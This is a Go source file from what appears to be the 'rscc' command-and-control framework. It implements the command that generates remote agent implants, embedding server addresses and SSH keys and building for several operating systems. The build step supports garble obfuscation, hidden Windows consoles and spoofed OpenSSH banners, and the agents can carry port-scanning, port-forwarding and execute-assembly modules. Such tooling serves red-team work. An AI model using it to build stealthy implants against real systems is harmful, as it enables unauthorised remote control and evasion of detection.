package agentcmd

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"rscc"
	"rscc/internal/common/constants"
	"rscc/internal/common/pprint"
	"rscc/internal/common/utils"
	"rscc/internal/common/validators"
	"rscc/internal/sshd"
	"runtime"
	"strconv"
	"strings"
	"text/template"

	"github.com/cespare/xxhash/v2"
	"github.com/spf13/cobra"
)

type BuilderConfig struct {
	Name    string
	OS      string
	Arch    string
	Servers []string
	Shared  bool
	Pie     bool
	Garble  bool
	Debug   bool
	SS      []string
	PrivKey []byte
}

func (a *AgentCmd) newCmdGenerate() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "generate",
		Short:   "Generate an agent",
		Aliases: []string{"g", "gen"},
		Args:    cobra.NoArgs,
		RunE:    a.cmdGenerate,
	}
	cmd.Flags().StringP("name", "n", utils.GetRandomName(), "agent name (random if not provided)")
	cmd.Flags().StringP("os", "o", runtime.GOOS, "operating system (linux, windows, darwin)")
	cmd.Flags().StringP("arch", "a", runtime.GOARCH, "architecture (amd64, arm64)")
	cmd.Flags().StringSliceP("servers", "s", []string{}, "server addresses (e.g. '127.0.0.1:8080,127.0.0.1:8081')")
	cmd.Flags().Bool("shared", false, "generate a shared library")
	cmd.Flags().Bool("pie", false, "generate a position independent executable")
	cmd.Flags().Bool("garble", false, "use garble to obfuscate agent")
	cmd.Flags().Bool("debug", false, "enable debug messages")
	cmd.Flags().StringSlice("ss", []string{"sftp", "kill"}, "subsystems to add to the agent (sftp, kill, pscan, pfwd, executeassembly)")
	cmd.MarkFlagsMutuallyExclusive("shared", "pie")
	cmd.MarkFlagRequired("servers")

	return cmd
}

func (a *AgentCmd) cmdGenerate(cmd *cobra.Command, args []string) error {
	// Get flags
	name, err := cmd.Flags().GetString("name")
	if err != nil {
		return err
	}
	goos, err := cmd.Flags().GetString("os")
	if err != nil {
		return err
	}
	goarch, err := cmd.Flags().GetString("arch")
	if err != nil {
		return err
	}
	servers, err := cmd.Flags().GetStringSlice("servers")
	if err != nil {
		return err
	}
	shared, err := cmd.Flags().GetBool("shared")
	if err != nil {
		return err
	}
	pie, err := cmd.Flags().GetBool("pie")
	if err != nil {
		return err
	}
	garble, err := cmd.Flags().GetBool("garble")
	if err != nil {
		return err
	}
	debug, err := cmd.Flags().GetBool("debug")
	if err != nil {
		return err
	}
	ss, err := cmd.Flags().GetStringSlice("ss")
	if err != nil {
		return err
	}

	// Validate flags
	if !validators.ValidateGOOS(goos) {
		return fmt.Errorf("invalid operating system: %s", goos)
	}
	if !validators.ValidateGOARCH(goarch) {
		return fmt.Errorf("invalid architecture: %s", goarch)
	}
	for i, s := range servers {
		servers[i] = strings.TrimSpace(s)
		if !validators.ValidateAddr(servers[i]) {
			return fmt.Errorf("invalid server address: %s", s)
		}
	}
	for i, s := range ss {
		ss[i] = strings.TrimSpace(s)
		if !validators.ValidateSybsystem(ss[i]) {
			return fmt.Errorf("invalid subsystem: %s", s)
		}
	}
	name = strings.ReplaceAll(strings.TrimSpace(name), " ", "-")

	// Set extension
	switch goos {
	case "windows":
		if shared {
			if !strings.HasSuffix(name, ".dll") {
				name = fmt.Sprintf("%s.dll", name)
			}
		} else {
			if !strings.HasSuffix(name, ".exe") {
				name = fmt.Sprintf("%s.exe", name)
			}
		}
	case "darwin":
		if shared {
			if !strings.HasSuffix(name, ".dylib") {
				name = fmt.Sprintf("%s.dylib", name)
			}
		}
	case "linux":
		if shared {
			if !strings.HasSuffix(name, ".so") {
				name = fmt.Sprintf("%s.so", name)
			}
		}
	}

	// Check database
	agent, err := a.db.GetAgentByName(cmd.Context(), name)
	if err == nil && agent != nil {
		return fmt.Errorf("agent `%s` already exists", name)
	}

	// Check if agent with same name already exists
	agentPath := filepath.Join(a.dataPath, constants.AgentDir, name)
	if _, err := os.Stat(agentPath); !os.IsNotExist(err) {
		cmd.Println(pprint.Warn("Agent `%s` not found in database, but file `%s` exists. File `%s` will be replaced", name, agentPath, agentPath))
	}

	// Generate keys
	keyPair, err := sshd.NewECDSAKey()
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %w", err)
	}
	privKey, err := keyPair.GetPrivateKey()
	if err != nil {
		return fmt.Errorf("failed to get private key: %w", err)
	}
	pubKey, err := keyPair.GetPublicKey()
	if err != nil {
		return fmt.Errorf("failed to get public key: %w", err)
	}

	// Unzip agent
	tmpDir, err := unzipAgent()
	if err != nil {
		return fmt.Errorf("failed to unzip agent: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Prepare builder config
	builderConfig := BuilderConfig{
		Name:    name,
		OS:      goos,
		Arch:    goarch,
		Servers: servers,
		Shared:  shared,
		Pie:     pie,
		Garble:  garble,
		Debug:   debug,
		SS:      ss,
		PrivKey: privKey,
	}

	// Template agent
	if err := templateAgent(tmpDir, builderConfig); err != nil {
		return fmt.Errorf("failed to template agent: %w", err)
	}

	// Build agent
	cmd.Println(pprint.Info(
		"Building agent '%s' for %s/%s",
		pprint.Green.Sprint(name),
		pprint.Bold.Sprint(goos),
		pprint.Bold.Sprint(goarch),
	))
	if err := buildAgent(tmpDir, builderConfig, a.dataPath); err != nil {
		return fmt.Errorf("failed to build agent: %w", err)
	}

	// Get agent hash
	agentPath = filepath.Join(a.dataPath, constants.AgentDir, name)
	agentBytes, err := os.ReadFile(agentPath)
	if err != nil {
		return fmt.Errorf("failed to read agent: %w", err)
	}
	agentHash := strconv.FormatUint(xxhash.Sum64(agentBytes), 10)

	// Add agent to database
	agent, err = a.db.CreateAgent(cmd.Context(), name, goos, goarch, servers, shared, pie, garble, ss, agentHash, agentPath, pubKey)
	if err != nil {
		return fmt.Errorf("failed to add agent to database: %w", err)
	}

	cmd.Println(pprint.Success(
		"Agent '%s' generated! [ID: %s, Path: %s]\n",
		pprint.Green.Sprint(agent.Name),
		pprint.Blue.Sprint(agent.ID),
		pprint.Yellow.Sprint(agent.Path),
	))
	return nil
}

func unzipAgent() (string, error) {
	tempDir, err := os.MkdirTemp("", "rscc-agent-*")
	if err != nil {
		return "", fmt.Errorf("create temp dir: %w", err)
	}

	zipReader, err := zip.NewReader(bytes.NewReader(rscc.ZipAgentSource), int64(len(rscc.ZipAgentSource)))
	if err != nil {
		return "", fmt.Errorf("create zip reader: %w", err)
	}

	for _, file := range zipReader.File {
		filePath := filepath.Join(tempDir, file.Name)

		// If directory
		if file.FileInfo().IsDir() {
			err = os.MkdirAll(filePath, 0777)
			if err != nil {
				return "", fmt.Errorf("create dir: %w", err)
			}
			continue
		}

		// Open zipped file
		rc, err := file.Open()
		if err != nil {
			return "", fmt.Errorf("open zipped file: %w", err)
		}
		defer rc.Close()

		// Create unzipped file
		unzippedFile, err := os.Create(filePath)
		if err != nil {
			return "", fmt.Errorf("create unzipped file: %w", err)
		}
		defer unzippedFile.Close()

		// Copy file content
		_, err = io.Copy(unzippedFile, rc)
		if err != nil {
			return "", fmt.Errorf("copy file content: %w", err)
		}
	}

	return tempDir, nil
}

// templateAgent templates agent source code
func templateAgent(tmpDir string, builderConfig BuilderConfig) error {
	err := filepath.WalkDir(tmpDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return fmt.Errorf("walk dir: %w", err)
		}

		// Skip directories
		if d.IsDir() {
			// Ignore vendor directory
			if d.Name() == "vendor" {
				return filepath.SkipDir
			}
			return nil
		}

		// Check extension
		if !strings.HasSuffix(path, ".go") {
			return nil
		}

		// Read file
		content, err := os.ReadFile(path)
		if err != nil {
			return fmt.Errorf("read file: %w", err)
		}

		// Check if file is a template
		if !strings.Contains(string(content), "{{") {
			return nil
		}

		// Create template
		tmpl, err := template.New(path).Parse(string(content))
		if err != nil {
			return fmt.Errorf("parse template: %w", err)
		}

		// Execute template
		buf := bytes.NewBuffer([]byte{})
		if err := tmpl.Execute(buf, builderConfig); err != nil {
			return fmt.Errorf("execute template: %w", err)
		}

		// Write file
		if err := os.WriteFile(path, buf.Bytes(), os.ModePerm); err != nil {
			return fmt.Errorf("write file: %w", err)
		}

		return nil
	})
	if err != nil {
		return fmt.Errorf("template agent: %w", err)
	}
	return nil
}

func buildAgent(tmpDir string, builderConfig BuilderConfig, dataPath string) error {
	// Check go toolchain
	goCmd := exec.Command("go", "version")
	output, err := goCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("check go version: %w", err)
	}
	if !strings.Contains(string(output), "go version") {
		return fmt.Errorf("go toolchain not found (install from https://go.dev/doc/install)")
	}

	// Check garble
	if builderConfig.Garble {
		garbleCmd := exec.Command("garble", "version")
		output, err = garbleCmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("check garble version: %w", err)
		}
		if !strings.Contains(string(output), "Build settings") {
			return fmt.Errorf("garble not found (install from https://github.com/burrowers/garble)")
		}
	}

	// Rename agent
	sshVersion := "SSH-2.0-OpenSSH_8.2"
	if builderConfig.OS == "windows" {
		sshVersion = constants.SshBannersWindows[utils.RandInt(len(constants.SshBannersWindows))]
	}
	if builderConfig.OS == "darwin" {
		sshVersion = constants.SshBannersDarwin[utils.RandInt(len(constants.SshBannersDarwin))]
	}
	if builderConfig.OS == "linux" {
		sshVersion = constants.SshBannersLinux[utils.RandInt(len(constants.SshBannersLinux))]
	}

	privKeyBase64 := base64.RawStdEncoding.EncodeToString(builderConfig.PrivKey)
	servers := strings.Join(builderConfig.Servers, ",")

	// Set ldflags
	ldflags := "-s -w"
	if builderConfig.OS == "windows" && !builderConfig.Debug {
		ldflags = fmt.Sprintf("%s -H windowsgui", ldflags)
	}

	ldflags = fmt.Sprintf("%s -X main.privKey=%s", ldflags, privKeyBase64)
	ldflags = fmt.Sprintf("%s -X main.servers=%s", ldflags, servers)
	ldflags = fmt.Sprintf("%s -X main.sshVersion=%s", ldflags, sshVersion)
	ldflags = fmt.Sprintf("%s -buildid=", ldflags)

	// Additionnal buildMode
	buildMode := ""
	switch {
	case builderConfig.Shared:
		buildMode = "-buildmode=c-shared"
	case builderConfig.Pie:
		buildMode = "-buildmode=pie"
	default:
		buildMode = "-buildmode=default"
	}

	// Tags
	tags := ""
	if len(builderConfig.SS) > 0 {
		tags = strings.Join(builderConfig.SS, ",")
	}

	// Build agent
	var cmd *exec.Cmd
	if builderConfig.Garble {
		cmd = exec.Command(
			"garble",
			"-tiny",
			"-seed=random",
			"-literals",
			"build",
			"-o",
			filepath.Join(dataPath, constants.AgentDir, builderConfig.Name),
			"-mod=vendor",
			"-trimpath",
			fmt.Sprintf("-ldflags=%s", ldflags),
			fmt.Sprintf("-tags=%s", tags),
			buildMode,
			"cmd/agent/main.go",
		)
	} else {
		cmd = exec.Command(
			"go",
			"build",
			"-o",
			filepath.Join(dataPath, constants.AgentDir, builderConfig.Name),
			"-mod=vendor",
			"-trimpath",
			fmt.Sprintf("-ldflags=%s", ldflags),
			fmt.Sprintf("-tags=%s", tags),
			buildMode,
			"cmd/agent/main.go",
		)
	}
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS="+builderConfig.OS, "GOARCH="+builderConfig.Arch)

	// Run command
	output, err = cmd.CombinedOutput()
	if err != nil {
		err = fmt.Errorf("run build: %w", err)
		if len(output) > 0 {
			err = fmt.Errorf("%w:\n%s", err, string(output))
		}
		return err
	}

	return nil
}
